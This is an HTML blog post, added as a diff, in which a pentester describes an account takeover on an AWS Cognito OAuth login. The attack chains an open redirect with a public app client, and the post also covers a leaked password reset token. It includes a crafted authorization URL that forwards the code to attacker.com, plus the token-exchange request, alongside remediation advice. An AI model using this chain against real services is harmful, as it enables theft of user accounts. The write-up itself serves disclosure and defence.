@@ -1,0 +1,218 @@
+<!DOCTYPE html>
+<html lang="en" class="dark">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Authorization Code Interception via Open Redirect in an AWS Cognito OAuth Flow - IamJfabian</title>
+    <link rel="icon" type="image/png" href="/images/favicon.png">
+    <script src="https://cdn.tailwindcss.com"></script>
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/devicons/devicon@latest/devicon.min.css" />
+    <style>
+      :root { color-scheme: dark; }
+      html, body { background-color: #121212; color: #f3f4f6; font-family: system-ui, sans-serif; }
+      pre { background: #0d0d0d; border: 1px solid #2d2d2d; border-radius: 8px; padding: 1.25rem; overflow-x: auto; margin: 2rem 0; }
+      code { font-family: 'Courier New', monospace; font-size: 0.85rem; color: #d1d5db; }
+      p code, li code { background: #1a1a1a; padding: 2px 6px; border-radius: 4px; font-size: 0.82rem; color: #e5e7eb; }
+      .tag { display: inline-block; background: #1f2937; border: 1px solid #374151; border-radius: 4px; padding: 2px 10px; font-size: 0.72rem; color: #9ca3af; margin-right: 6px; margin-bottom: 6px; }
+      .concept-box { background: #0f172a; border-left: 3px solid #3b82f6; padding: 1.25rem 1.5rem; border-radius: 0 8px 8px 0; margin: 2rem 0; }
+      .concept-box .label { font-size: 0.7rem; color: #60a5fa; font-weight: 700; letter-spacing: 0.08em; text-transform: uppercase; margin-bottom: 0.6rem; }
+      .concept-box p { margin: 0; color: #cbd5e1; line-height: 1.75; }
+      .step-label { font-size: 0.68rem; color: #6b7280; font-weight: 700; letter-spacing: 0.1em; text-transform: uppercase; margin-bottom: 0.75rem; display: block; }
+      h1 { color: #f9fafb; }
+      h2 { color: #f9fafb; font-size: 1.4rem; font-weight: 600; margin-top: 3rem; margin-bottom: 1.25rem; padding-bottom: 0.5rem; border-bottom: 1px solid #1f2937; }
+      h3 { color: #e5e7eb; font-size: 1.1rem; font-weight: 500; margin-top: 2.5rem; margin-bottom: 1rem; }
+      p { color: #9ca3af; line-height: 1.8; margin-top: 0; margin-bottom: 1.5rem; }
+      ul { margin-bottom: 1.5rem; }
+      ul li { color: #9ca3af; line-height: 1.8; margin-bottom: 0.6rem; }
+      strong { color: #e5e7eb; }
+    </style>
+  </head>
+  <body class="min-h-screen">
+    <nav class="border-b border-gray-800 px-6 py-4 flex items-center justify-between">
+      <a href="/" class="text-xl font-bold text-white">Josias Fabian</a>
+      <div class="flex gap-6 text-gray-400 text-sm">
+        <a href="/about" class="hover:text-white transition">About</a>
+        <a href="/experience" class="hover:text-white transition">Experience</a>
+        <a href="/projects" class="hover:text-white transition">Projects</a>
+        <a href="/blogs" class="hover:text-white transition">Blogs</a>
+        <a href="/contact" class="hover:text-white transition">Contact</a>
+      </div>
+    </nav>
+
+    <main class="max-w-2xl mx-auto px-6 py-16">
+
+      <div class="mb-6">
+        <span class="tag">OAuth 2.0</span>
+        <span class="tag">AWS Cognito</span>
+        <span class="tag">Open Redirect</span>
+        <span class="tag">Account Takeover</span>
+        <span class="tag">Token Leak</span>
+      </div>
+
+      <h1 class="text-3xl font-bold text-white mb-3 leading-tight">Authorization Code Interception via Open Redirect in an AWS Cognito OAuth Flow</h1>
+      <p class="text-gray-500 text-sm mb-12">2025 &nbsp;·&nbsp; Web Application Pentest</p>
+
+      <h2>How to Approach OAuth Security Testing</h2>
+
+      <p>OAuth vulnerabilities tend to hide in the seams between components. The identity provider, the application, and the browser each play a role in the flow, and misconfigurations at any of those handoff points can be critical. Most developers get the happy path right but leave edge cases unchecked.</p>
+
+      <p>When you start testing an OAuth implementation, the first thing to do is map the flow by watching traffic in Burp during login. Look at what parameters are being passed in the authorization request: <code>response_type</code>, <code>redirect_uri</code>, <code>state</code>, <code>client_id</code>, and <code>scope</code>. Each of these is a test surface.</p>
+
+      <p>Start with <code>redirect_uri</code> manipulation. Modify it to a domain you control and observe what the identity provider does. Most modern providers will reject it, but the interesting cases are when the application itself has an open redirect somewhere in the allowed callback path that can be used to forward the code onward.</p>
+
+      <p>Then test the client type. Send a token exchange request with a garbage authorization code to the token endpoint. A confidential client will reject the request before even checking the code, because the client secret is missing or invalid. A public client will get further in the process and fail on the code itself. That distinction tells you how much protection exists around the code once it is obtained.</p>
+
+      <p>Do not skip the state parameter. Remove it entirely and complete the login flow. If it succeeds, CSRF on login is possible. Also verify that the state is actually validated on the callback and not just echoed back to the client without comparison.</p>
+
+      <p>After gaining access to any account, inspect every field in the user profile API response carefully. Reset tokens, API keys, internal identifiers, and session handles are frequently included in responses during development and never removed before production.</p>
+
+      <h2>Background</h2>
+
+      <p>This post covers an account takeover I found during a web application engagement. The target used AWS Cognito as its identity provider and implemented the OAuth 2.0 Authorization Code Grant for user authentication. On the surface the setup looked standard. Cognito is a mature service and when configured correctly it handles a lot of the security guarantees automatically. The issue was not with Cognito itself but with two decisions the application team made around it: how the SSO callback handled redirects, and whether the app client required a secret.</p>
+
+      <p>OAuth misconfigurations like this are more common than they should be. They tend to surface in applications that integrated a third-party identity provider quickly, often following the provider's quickstart documentation, which prioritizes getting authentication working over hardening every parameter. The open redirect in particular is easy to miss because it does not look dangerous in isolation. It only becomes critical when combined with the public client.</p>
+
+      <h2>Understanding OAuth 2.0 and the Authorization Code Grant</h2>
+
+      <p>OAuth 2.0 is an authorization framework that allows applications to request limited access to user accounts on a third-party service. Instead of sharing credentials directly with the application, the user authenticates with the identity provider and the application receives a token it can use to act on the user's behalf.</p>
+
+      <p>The Authorization Code Grant is the recommended flow for web applications. It works in two phases. First, the user is redirected to the identity provider, authenticates there, and the provider sends a short-lived authorization code back to the application via a redirect to a pre-registered callback URL. Second, the application exchanges that code server-side for the actual access and identity tokens. The code is designed to be a disposable intermediary that travels through the browser but can only be redeemed by the server that holds the client secret.</p>
+
+      <div class="concept-box">
+        <div class="label">Concept</div>
+        <p>A <strong style="color:#93c5fd;">public client</strong> is an OAuth app client that does not require a client secret for token exchange. It is intended for native apps and single-page apps where a secret cannot be kept confidential. When used for a server-side web application, it removes the main protection that makes the Authorization Code Grant safe: the requirement that only the legitimate server can exchange a code for tokens.</p>
+      </div>
+
+      <svg width="100%" viewBox="0 0 680 520" role="img" style="margin: 2rem 0; display: block;">
+        <title>OAuth Authorization Code Interception Attack Chain</title>
+        <desc>Flowchart showing 5 steps: attacker crafts link, victim authenticates on Cognito, code redirected to attacker, attacker exchanges code, full account access.</desc>
+        <defs>
+          <marker id="arrow" viewBox="0 0 10 10" refX="8" refY="5" markerWidth="6" markerHeight="6" orient="auto-start-reverse">
+            <path d="M2 1L8 5L2 9" fill="none" stroke="context-stroke" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round"/>
+          </marker>
+        </defs>
+        <style>
+          .arr { stroke: var(--arr-color, #6b7280); fill: none; stroke-width: 1.5; }
+          .th { font-family: system-ui, sans-serif; font-size: 14px; font-weight: 500; fill: #f3f4f6; }
+          .ts { font-family: system-ui, sans-serif; font-size: 12px; font-weight: 400; fill: #9ca3af; }
+          .c-coral rect { fill: #3d1a13; stroke: #993c1d; }
+          .c-gray rect { fill: #1f2937; stroke: #374151; }
+          .c-amber rect { fill: #2d1f08; stroke: #854f0b; }
+          .c-red rect { fill: #3d1212; stroke: #a32d2d; }
+        </style>
+        <g class="c-coral"><rect x="200" y="20" width="280" height="56" rx="8" stroke-width="0.5"/><text class="th" x="340" y="42" text-anchor="middle" dominant-baseline="central">Attacker crafts malicious link</text><text class="ts" x="340" y="62" text-anchor="middle" dominant-baseline="central">redirect_uri points to attacker server</text></g>
+        <line x1="340" y1="76" x2="340" y2="110" class="arr" marker-end="url(#arrow)"/>
+        <g class="c-gray"><rect x="200" y="110" width="280" height="56" rx="8" stroke-width="0.5"/><text class="th" x="340" y="132" text-anchor="middle" dominant-baseline="central">Victim clicks link</text><text class="ts" x="340" y="152" text-anchor="middle" dominant-baseline="central">Lands on legitimate Cognito login page</text></g>
+        <line x1="340" y1="166" x2="340" y2="200" class="arr" marker-end="url(#arrow)"/>
+        <g class="c-gray"><rect x="200" y="200" width="280" height="56" rx="8" stroke-width="0.5"/><text class="th" x="340" y="222" text-anchor="middle" dominant-baseline="central">Victim authenticates normally</text><text class="ts" x="340" y="242" text-anchor="middle" dominant-baseline="central">Cognito issues authorization code</text></g>
+        <line x1="340" y1="256" x2="340" y2="290" class="arr" marker-end="url(#arrow)"/>
+        <g class="c-amber"><rect x="200" y="290" width="280" height="56" rx="8" stroke-width="0.5"/><text class="th" x="340" y="312" text-anchor="middle" dominant-baseline="central">Open redirect forwards code</text><text class="ts" x="340" y="332" text-anchor="middle" dominant-baseline="central">sso_callback sends code to attacker</text></g>
+        <line x1="340" y1="346" x2="340" y2="380" class="arr" marker-end="url(#arrow)"/>
+        <g class="c-coral"><rect x="200" y="380" width="280" height="56" rx="8" stroke-width="0.5"/><text class="th" x="340" y="402" text-anchor="middle" dominant-baseline="central">Attacker exchanges code for tokens</text><text class="ts" x="340" y="422" text-anchor="middle" dominant-baseline="central">Public client, no secret required</text></g>
+        <line x1="340" y1="436" x2="340" y2="470" class="arr" marker-end="url(#arrow)"/>
+        <g class="c-red"><rect x="200" y="470" width="280" height="36" rx="8" stroke-width="0.5"/><text class="th" x="340" y="488" text-anchor="middle" dominant-baseline="central">Full account takeover</text></g>
+        <text class="ts" x="30" y="48" text-anchor="start">Step 1</text>
+        <text class="ts" x="30" y="138" text-anchor="start">Step 2</text>
+        <text class="ts" x="30" y="228" text-anchor="start">Step 3</text>
+        <text class="ts" x="30" y="318" text-anchor="start">Step 4</text>
+        <text class="ts" x="30" y="408" text-anchor="start">Step 5</text>
+        <text class="ts" x="30" y="488" text-anchor="start">Result</text>
+      </svg>
+      <h2>The Misconfiguration: Two Issues That Combined Into One Critical Finding</h2>
+
+      <p>The first issue was in how the SSO callback endpoint was implemented. After Cognito authenticated the user and issued an authorization code, it redirected the user back to the application's callback URL. The callback then read a destination parameter from the URL to decide where to send the user next. That destination was not validated against any allowlist, making it an open redirect.</p>
+
+      <p>On its own, an open redirect in a post-login flow is low to medium severity. The user is already authenticated at that point. But here it became the mechanism that allowed the authorization code to be delivered to attacker-controlled infrastructure.</p>
+
+      <p>The second issue was that the Cognito app client was configured as public. To confirm this I sent a token exchange request with an intentionally invalid authorization code and observed the error response. The server did not reject the request for a missing client secret. It got further in the process and failed on the code validation itself, which confirmed no secret was required.</p>
+
+      <div class="concept-box">
+        <div class="label">Concept</div>
+        <p>An <strong style="color:#93c5fd;">open redirect</strong> is a vulnerability where an application accepts an external URL as a parameter and redirects the user to it without validation. In the context of an OAuth callback, it allows the authorization code to be forwarded to any destination the attacker specifies, because the code travels in the URL during the redirect.</p>
+      </div>
+
+      <h2>The Attack Chain</h2>
+
+      <h3><span class="step-label">Step 1</span>Crafting the Authorization Request</h3>
+
+      <p>The authorization URL points to the legitimate Cognito hosted UI. The <code>redirect_uri</code> points to the application's real callback, which Cognito has registered. But appended to that callback is a <code>next</code> parameter pointing to attacker infrastructure. When Cognito redirects to the callback after authentication, the callback forwards the user again using that parameter, carrying the code along.</p>
+
+      <pre><code>https://auth.target.com/oauth2/authorize
+  ?response_type=code
+  &client_id=XXXXXXXXXX
+  &redirect_uri=https://app.target.com/sso_callback
+      ?next=https://attacker.com/capture
+  &scope=openid+profile+email</code></pre>
+
+      <h3><span class="step-label">Step 2</span>Victim Authenticates on the Real Cognito Page</h3>
+
+      <p>The victim receives this link and clicks it. They land on a completely legitimate Cognito login page at the real domain. There is no spoofing. They enter their credentials and complete any MFA required. Cognito issues a valid authorization code and redirects back to the callback.</p>
+
+      <h3><span class="step-label">Step 3</span>Code Forwarded to Attacker Infrastructure</h3>
+
+      <p>The callback receives the code and reads the <code>next</code> parameter. Without validating the destination, it redirects the victim to the attacker's server with the code in the URL. The attacker's server logs the incoming request.</p>
+
+      <pre><code>GET /capture?code=eyJhbGciOiJSUzI1NiJ9.XXXX&state=...
+
+# Code extracted. Victim is redirected again to look normal.</code></pre>
+
+      <h3><span class="step-label">Step 4</span>Exchanging the Code for Tokens</h3>
+
+      <p>The attacker takes the intercepted code and sends it directly to Cognito's token endpoint. Since the client is public, no secret is required. Cognito validates the code and returns a full token set belonging to the victim.</p>
+
+      <pre><code>POST /oauth2/token
+Content-Type: application/x-www-form-urlencoded
+
+grant_type=authorization_code
+&code=eyJhbGciOiJSUzI1NiJ9.XXXX
+&redirect_uri=https://app.target.com/sso_callback?next=https://attacker.com/capture
+&client_id=XXXXXXXXXX
+
+# Response: access_token, id_token, refresh_token for the victim's account</code></pre>
+
+      <p>A call to <code>/oauth2/userInfo</code> confirmed the identity. Full account access without the victim's password.</p>
+
+      <h2>Bonus Finding: Password Reset Token in the User Profile Response</h2>
+
+      <p>After gaining access to the account, I called the <code>/currentUser</code> endpoint to see what the application exposed about the authenticated user. The response included an active password reset token. It had not been requested by the victim. It was simply a field in the user object that the API returned on every profile request.</p>
+
+      <div class="concept-box">
+        <div class="label">Concept</div>
+        <p>A <strong style="color:#93c5fd;">password reset token</strong> is a temporary credential that allows a user to set a new password without knowing the current one. Exposing it in an API response means an attacker with read access to the user profile can silently reset the password, locking the legitimate owner out and maintaining access even after OAuth tokens expire or are revoked.</p>
+      </div>
+
+      <pre><code>{
+  "id": "usr_XXXXXX",
+  "email": "victim@target.com",
+  "passwordResetToken": "reset_XXXXXXXXXXXX",
+  "passwordResetExpiry": "2025-XX-XXT18:00:00Z"
+}</code></pre>
+
+      <h2>Impact</h2>
+      <ul class="list-disc list-inside ml-2">
+        <li>Full account takeover of any user who clicked the crafted link</li>
+        <li>No victim interaction beyond normal authentication, no phishing page required</li>
+        <li>Persistent access via password reset token extraction, independent of OAuth session lifetime</li>
+        <li>Potential for mass compromise if the link was distributed at scale</li>
+      </ul>
+
+      <h2>Remediation</h2>
+      <ul class="list-disc list-inside ml-2">
+        <li>Remove the open redirect from <code>/sso_callback</code> and manage post-login routing through server-side session state instead of URL parameters</li>
+        <li>Convert the Cognito app client to confidential and require a client secret for all token exchange requests</li>
+        <li>Implement PKCE as an additional layer of protection, especially if a public client is required</li>
+        <li>Remove password reset tokens and any security-sensitive fields from user profile API responses</li>
+        <li>Enforce a strict allowlist for all redirect URIs registered in the Cognito app client configuration</li>
+      </ul>
+
+      <div class="border-t border-gray-800 pt-8 mt-12 text-sm text-gray-600">
+        Vulnerability details have been generalized to protect client confidentiality. All findings were reported and remediated as part of the engagement.
+      </div>
+
+    </main>
+
+    <footer class="border-t border-gray-800 mt-20 py-6 text-center text-gray-600 text-sm">
+      2025 Josias Fabian &nbsp;·&nbsp; <a href="https://github.com/j05145" class="hover:text-white transition">GitHub</a>
+    </footer>
+  </body>
+</html>
